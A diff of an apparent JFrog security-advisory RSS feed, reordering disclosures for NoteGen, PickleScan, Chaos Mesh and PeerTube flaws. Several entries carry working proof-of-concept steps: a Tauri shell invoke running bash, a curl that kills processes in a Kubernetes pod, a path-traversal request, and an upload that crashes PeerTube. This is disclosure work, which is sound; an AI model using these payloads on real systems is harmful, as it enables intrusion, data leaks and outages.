@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Fri, 28 Aug 2026 03:04:44 GMT</lastBuildDate>
+        <lastBuildDate>Sat, 29 Aug 2026 00:34:48 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -221,6 +221,74 @@ https://github.com/MoonshotAI/kimi-code/releases/tag/%40moonshot-ai%2Fkimi-code%
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
+            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
+
+
+## Component
+
+note-gen (NoteGen)
+
+## Affected versions
+
+< 0.32.0
+
+## Description
+
+NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
+
+## PoC
+
+<br>
+
+**Step 1 - Obtain JavaScript execution in the NoteGen webview**
+
+<br>
+
+Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
+
+<br>
+
+**Step 2 - Invoke the Tauri shell execute API**
+
+<br>
+
+From the webview, call:
+
+```javascript
+window.__TAURI__.core.invoke('plugin:shell|execute', {
+  program: 'bash',
+  args: ['-c', 'open -a Calculator'],
+  options: { cwd: null, env: null, encoding: 'utf-8' }
+});
+```
+
+<br>
+
+**Step 3 - Verify OS command execution**
+
+<br>
+
+Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
+
+## Vulnerability Mitigations
+
+Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
+
+## References
+https://github.com/advisories/GHSA-r5ff-hq22-rhgv
+https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
+https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[NoteGen is vulnerable to Chat Preview XSS via Unsanitized AI/Skill HTML Rendering]]></title>
             <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</link>
             <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-chat-preview-xss-via-unsanitized-ai-skill-html-rendering-cve-2026-17496/</guid>
@@ -298,74 +366,6 @@ Upgrade to NoteGen 0.32.0 or later. The fix replaces unsanitized markdown-it HTM
 ## References
 https://github.com/advisories/GHSA-gwhc-vprp-gfcg
 https://github.com/codexu/note-gen/commit/ae3ba948c41d8a74b4a20f4c6f26fcdda2002298
-https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/notegen-is-vulnerable-to-arbitrary-os-command-execution-via-tauri-shell-allow-execute-cve-2026-17497/</guid>
-            <pubDate>Sun, 26 Jul 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-17497, HIGH, NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-NoteGen is vulnerable to Arbitrary OS Command Execution via Tauri shell:allow-execute for bash/python
-
-
-## Component
-
-note-gen (NoteGen)
-
-## Affected versions
-
-< 0.32.0
-
-## Description
-
-NoteGen before 0.32.0 grants the Tauri shell plugin shell:allow-execute capability for bash, python, and python3 with arbitrary arguments in the default desktop capabilities. JavaScript running in the application webview can therefore invoke plugin:shell|execute to run attacker-controlled operating system commands with the privileges of the NoteGen process. In combination with script execution in the webview, for example via chat XSS (CVE-2026-17496), this enables full remote code execution on the user's machine.
-
-## PoC
-
-<br>
-
-**Step 1 - Obtain JavaScript execution in the NoteGen webview**
-
-<br>
-
-Use chat XSS (CVE-2026-17496) or another webview script sink so attacker JavaScript runs inside NoteGen < 0.32.0 on a default installation.
-
-<br>
-
-**Step 2 - Invoke the Tauri shell execute API**
-
-<br>
-
-From the webview, call:
-
-```javascript
-window.__TAURI__.core.invoke('plugin:shell|execute', {
-  program: 'bash',
-  args: ['-c', 'open -a Calculator'],
-  options: { cwd: null, env: null, encoding: 'utf-8' }
-});
-```
-
-<br>
-
-**Step 3 - Verify OS command execution**
-
-<br>
-
-Expected result: Calculator opens as the NoteGen user, proving arbitrary OS command execution via bash -c. The same path can read local files and exfiltrate them to an attacker-controlled server.
-
-## Vulnerability Mitigations
-
-Upgrade to NoteGen 0.32.0 or later. The fix removes shell:allow-execute entries that permitted bash, python, and python3 with attacker-controlled arguments from the default Tauri capabilities, closing the webview-to-OS command execution path.
-
-## References
-https://github.com/advisories/GHSA-r5ff-hq22-rhgv
-https://github.com/codexu/note-gen/commit/00064a4a8ec4177d51094ffb3e15bf0758009c1f
 https://github.com/codexu/note-gen/releases/tag/note-gen-v0.32.0
 ]]></content:encoded>
         </item>
@@ -1419,56 +1419,6 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
-            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
-
-
-## Component
-
-[picklescan](https://pypi.org/project/picklescan/)
-
-## Affected versions
-
-( , 0.0.31)
-
-## Description
-
-The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
-
-## PoC
-
-The following steps demonstrate the vulnerability using a public model with a known CRC error.
-
-```bash
-# 1. Download a Pytorch model known to have a bad CRC.
-wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
-
-# 2. Attempt to scan the corrupted ZIP file with PickleScan.
-picklescan -p pytorch_model.bin
-
-# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
-
-# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
-```
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-## References
-
-[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
-[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[PickleScan Bypass via File Extension Mismatch]]></title>
             <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</link>
             <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10155/</guid>
@@ -1519,6 +1469,56 @@ No mitigations are supplied for this issue
 
 [GHSA](https://github.com/advisories/GHSA-jgw4-cr84-mqxg)
 [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10155)
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[PickleScan Bypass via ZIP file bad CRC]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/picklescan-cve-2025-10156/</guid>
+            <pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[A bad CRC in a ZIP archive causes PickleScan to fail, allowing malicious pickle files within the archive to evade detection.]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+An Improper Handling of Exceptional Conditions vulnerability in the ZIP archive scanning component of mmaitre314 picklescan allows a remote attacker to bypass security scans. This is achieved by crafting a ZIP archive containing a file with a bad Cyclic Redundancy Check (CRC), which causes the scanner to halt and fail to analyze the contents for malicious pickle files. When the file incorrectly considered safe is loaded, it can lead to the execution of malicious code.
+
+
+## Component
+
+[picklescan](https://pypi.org/project/picklescan/)
+
+## Affected versions
+
+( , 0.0.31)
+
+## Description
+
+The vulnerability stems from how PickleScan handles ZIP archives. It uses Python's standard `zipfile` module, which raises an exception when it encounters a file with a CRC mismatch. PickleScan does not handle this exception gracefully; it halts the scan instead of attempting to process other valid files within the archive. This behavior creates a security blind spot, as PyTorch may be configured to ignore CRC errors and load a model from the same corrupted archive, inadvertently executing a malicious pickle payload that PickleScan failed to detect.
+
+## PoC
+
+The following steps demonstrate the vulnerability using a public model with a known CRC error.
+
+```bash
+# 1. Download a Pytorch model known to have a bad CRC.
+wget https://huggingface.co/jinaai/jina-embeddings-v2-base-en/resolve/main/pytorch_model.bin?download=true -O pytorch_model.bin
+
+# 2. Attempt to scan the corrupted ZIP file with PickleScan.
+picklescan -p pytorch_model.bin
+
+# Observed Result: PickleScan returns an error about a bad ZIP file and does not scan any content within the archive.
+
+# Expected Result: PickleScan should warn about the CRC error but still attempt to scan accessible files within the archive for threats.
+```
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+## References
+
+[GHSA](https://github.com/advisories/GHSA-mjqp-26hc-grxg)
+[NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-10156)
 ]]></content:encoded>
         </item>
         <item>
@@ -1680,59 +1680,6 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
-            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Denial of Service via Unauthorized Access to Chaos Mesh debugging server
-
-## Component
-
-github.com/chaos-mesh/chaos-mesh
-
-## Affected versions
-
-(,2.7.2]
-
-## Description
-
-The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.
-
-
-## PoC
-
-```shell
-curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query
-
-```
-
-
-
-## Vulnerability Mitigations
-
-If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
-
-```shell
-helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
-```
-
-
-
-## References
-
-[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
-
-[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Chaos Mesh killProcesses command injection]]></title>
             <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</link>
             <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-command-injection-killprocesses-jfsa-2025-001449535/</guid>
@@ -1782,6 +1729,59 @@ helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --se
 [Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
 
 [JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Chaos Mesh debugging server DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/chaos-mesh-debugging-server-denial-of-service-jfsa-2025-001449533/</guid>
+            <pubDate>Mon, 15 Sep 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-59358, HIGH, Denial of Service via Unauthorized Access to Chaos Mesh debugging server]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Denial of Service via Unauthorized Access to Chaos Mesh debugging server
+
+## Component
+
+github.com/chaos-mesh/chaos-mesh
+
+## Affected versions
+
+(,2.7.2]
+
+## Description
+
+The Chaos Controller Manager in Chaos Mesh exposes a GraphQL debugging server without authentication to the entire Kubernetes cluster, which provides an API to kill arbitrary processes in any Kubernetes pod, leading to cluster-wide denial of service.
+
+
+## PoC
+
+```shell
+curl -X POST -H "Content-Type: application/json" -d '{"query": "mutation KillProcessesInPod { pod(ns: \"kube-system\", name: \"kube-apiserver-minikube\") { killProcesses(pids: [\"1\"]) { pid command } } }"}' http://controller-manager-host:10082/query
+
+```
+
+
+
+## Vulnerability Mitigations
+
+If upgrading Chaos-Mesh to the fixed version is not possible, re-deploy the Helm chart and disable the **chaosctl** tool and port:
+
+```shell
+helm install chaos-mesh chaos-mesh/chaos-mesh -n=chaos-mesh --version 2.7.x --set enableCtrlServer=false
+```
+
+
+
+## References
+
+[Fix PR](https://github.com/chaos-mesh/chaos-mesh/pull/4702)
+
+[JFrog Technical Blog](https://jfrog.com/blog/chaotic-deputy-critical-vulnerabilities-in-chaos-mesh-lead-to-kubernetes-cluster-takeover)
+
+
 
 ]]></content:encoded>
         </item>
@@ -2506,6 +2506,72 @@ It is recommended to switch to this maintained library if possible.
 [Original advisory](https://github.com/mholt/archives/issues/27)]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
+            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
+            <content:encoded><![CDATA[## Summary
+This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
+
+## Component
+
+[PeerTube](https://github.com/Chocobozzz/PeerTube)
+
+
+
+## Affected versions
+
+(, 7.1.0]
+
+
+
+## Description
+
+If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t valid, an error will be thrown, and will later be thrown again by the **_destroy** function in **got**, and will not be caught, causing the server to crash.
+
+It is also possible to trigger the attack by causing the server to actively fetch activities from a remote server. This can be done in different ways, for example by using the **/api/v1/search/video-channels** path, and passing the **search** argument with a URL that can be used for the attack. This can be done only if users have the ability to search remote URIs (**search.remote_uri** in the configuration), which by default is enabled for registered users.
+
+
+
+## PoC
+
+This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). We also assume that there are 2 existing users on the instance: the default root user and a low privileged user.
+
+
+
+1. First, using a browser, log in to the PeerTube instance with the low privileged user’s credentials, and use the inspection screen to copy the authorization token of the user.
+
+1. In a terminal, run the following command (you will need to install the **flask** package for python if it is not installed on the system):
+
+   ```
+   python malicious_rest_server.py
+   ```
+
+   This will start a server listening on port 1234.
+
+1. In another terminal, run the following command (insert the user token in the proper place):
+
+   ```
+   curl -v 'http://localhost:3000/api/v1/search/video-channels?search=http://localhost:1234/accounts/root_crash' -H 'Authorization: Bearer user_token'
+   ```
+
+   This technique is based on PeerTube’s search for channels. After fetching the outbox of a user, it will not be possible to ask for the same user again using this technique until the refresh interval will pass. This means that every time you want to run this curl command you should change something in the username (for example `http://localhost:1234/accounts/root1_crash` instead of `http://localhost:1234/accounts/root_crash`) .
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
+
+[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[PeerTube ActivityPub Crawl Infinite Loop DoS]]></title>
             <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</link>
             <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-crawl-dos/</guid>
@@ -2774,15 +2840,13 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
+            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
             <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service]]></description>
+            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
             <content:encoded><![CDATA[## Summary
-An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.
-
-This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.
+This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
 
 
 
@@ -2800,23 +2864,21 @@ This vulnerability allows any authenticated user to cause the server to stop fun
 
 ## Description
 
-If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
-If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.
+One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
 
 ## PoC
 
 This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
 
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
+1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
+1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
+1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
 
-
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
-1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
-1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
 ```
-new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
-curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
+curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
 ```
-If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
+The .m3u8 file will be returned.
 
 
 
@@ -2892,13 +2954,15 @@ No mitigations are supplied for this issue
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[PeerTube HLS Video Files Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-hls-path-traversal/</guid>
+            <title><![CDATA[PeerTube User Import Authenticated Persistent Denial of Service]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/peertube-archive-persistent-dos/</guid>
             <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32943 Low severity. A Path Traversal allows any authenticated user to leak the contents of arbitrary .m3u8 files from the server]]></description>
+            <description><![CDATA[CVE-2025-32944 Medium severity. PeerTube User Import Authenticated Persistent Denial of Service]]></description>
             <content:encoded><![CDATA[## Summary
-This vulnerability allows any authenticated user to leak the contents of arbitrary “.m3u8” files from the server.
+An Uncaught Exception in PeerTube can lead to a persistent Denial of Service in User Import.
+
+This vulnerability allows any authenticated user to cause the server to stop functioning in a persistent manner.
 
 
 
@@ -2916,89 +2980,25 @@ This vulnerability allows any authenticated user to leak the contents of arbitra
 
 ## Description
 
-One of PeerTube’s API endpoints is `/static/streaming-playlists/hls/private/:videoUUID/:playlistName.m3u8`. This endpoint is used to fetch a `.m3u8` file of a private video. The code first checks that a valid video token was sent, and then sends the file contents. PeerTube does not sanitize the `playlistName` argument correctly. Instead of sanitizing the `playlistName` argument from `req.param`, [it tries to sanitize an optional playlistName argument from the query string](https://github.com/Chocobozzz/PeerTube/blob/f0f44e1704db1187ed267ced69cec414974275f5/server/core/middlewares/validators/static.ts#L74). An attacker can use the UUID of a public video, and insert `..%2f` in the `playlistName` field to traverse out of the video’s directory and into any other directory in the system and receive any `.m3u8` file. Reading a meaningful file might be difficult since there is a need to know the exact path of the specific `.m3u8` file wanted.
+If user import is enabled (which is the default setting), any registered user can upload an archive for importing. The code uses the yauzl library for reading the archive.
+If the yauzl library encounters a filename that is considered illegal, [it raises an exception](https://github.com/thejoshwolfe/yauzl/blob/de292f220268473eb20aef64b0a77faa9d004d9a/index.js#L737). For example, if a filename includes “..” in one of its parts, an “invalid relative path” error is raised. PeerTube does not catch this exception, thus it crashes. Even after starting the server again, it tries to read the file and crashes again, causing a permanent denial of service until the file is deleted from the system.
 
 ## PoC
 
 This PoC assumes that there is a PeerTube instance on the machine listening on ports 3000 (client) and 9000 (server). Note that running this PoC will cause PeerTube’s server to shut down.
 
-1. First, using a browser, log in to the PeerTube instance with any user’s credentials.
-1. Upload a video to the server and make it private. Browse to the new uploaded video, and use the inspection screen to find and copy the video’s playlist UUID and .m3u8 filename. Save this information.
-1. Upload another video and make it public. Use the inspection screen to find and copy the video’s UUID.
-1. In a terminal, run the following commands (replace “public_uuid” with the UUID of the public video, “private_uuid” with the UUID of the private video, and “private_m3u8_file.m3u8” with the .m3u8 filename, all from step #1):
 
+
+1. First, using a browser, log in to the PeerTube instance with any user’s credentials, and use the inspection screen to copy the authorization token of the user.
+1. Create a file `evil.zip` in the current directory, which contains at least one zip entry with a `..` in its path
+1. In a terminal, run the following commands (replace “user_token” with the token obtained from step #1):
 ```
-curl --path-as-is http://localhost:3000/static/streaming-playlists/hls/private/public_uuid/..%2fprivate_uuid%2fprivate_m3u8_file.m3u8 -H "x-peertube-video-password: 123"
+new_location=http:$(curl -s -D - 'http://127.0.0.1:3000/api/v1/users/1/imports/import-resumable' -H 'Authorization: Bearer user_token' -H 'Content-Type: application/json; charset=UTF-8' -H 'X-Upload-Content-Length: 168' -H 'X-Upload-Content-Type: application/x-zip-compressed' --data-raw '{"name":"evil.zip","mimeType":"application/x-zip-compressed","size":168,"lastModified":1743493990068,"filename":"evil.zip"}' | awk '/^location:/{print $2}' | tr -d '\r')
+curl -X PUT "$new_location" -H "Content-Type: application/octet-stream" -H "Content-Range: bytes 0-167/168" -H 'Authorization: user_token' --data-binary @evil.zip
 ```
-The .m3u8 file will be returned.
+If everything was done correctly, the PeerTube server will crash, and will keep crashing as long as the ZIP file is not deleted from the system.
 
 
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
-
-## References
-
-[Fix release](https://github.com/Chocobozzz/PeerTube/releases/tag/v7.1.1)
-
-[PoC Materials](https://drive.google.com/file/d/1zmXFNutT4ACOJZGmxhU22nhu9Fbn4ui2/view?usp=drive_link)
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/peertube-activitypub-playlist-creation-blind-ssrf-dos/</guid>
-            <pubDate>Mon, 14 Apr 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-32948 High severity. PeerTube ActivityPub Playlist Creation Blind SSRF and DoS]]></description>
-            <content:encoded><![CDATA[## Summary
-This vulnerability allows any attacker to cause the server to stop functioning, or in special cases send requests to arbitrary URLs (Blind SSRF).
-
-## Component
-
-[PeerTube](https://github.com/Chocobozzz/PeerTube)
-
-
-
-## Affected versions
-
-(, 7.1.0]
-
-
-
-## Description
-
-If federation is enabled (which is the default), PeerTube listens for POST requests to the **/inbox** path. This path is used for receiving ActivityPub activities. One of the possible activities is the Create Activity, which creates different objects on the server. One of the objects that may be created is a playlist. Part of the parsing of playlist ActivityPub objects includes fetching the playlist elements. The function that gets the list of the playlist items to fetch is **fetchElementUrls**. It is called from **createOrUpdateVideoPlaylist**. Afterwards, the **rebuildVideoPlaylistElements** function is called, which in turn calls the **buildElementsDBAttributes**, that calls **fetchRemotePlaylistElement** for each element. If the activity has an object instead of a string in the **url** field, the object will eventually be passed into the **got** library that is used by PeerTube, and will be parsed as additional options for the fetch. If the object will have valid options, they will be used by the **got** libraries. Such an example could be **{“enableUnixSockets”: true, “url”: “unix:/….”}**, which will cause the library to fetch from a UNIX socket (which won’t be protected by the **got-ssrf** library). Also the HTTP method can be changed, and some other options. In the case that the key isn’t 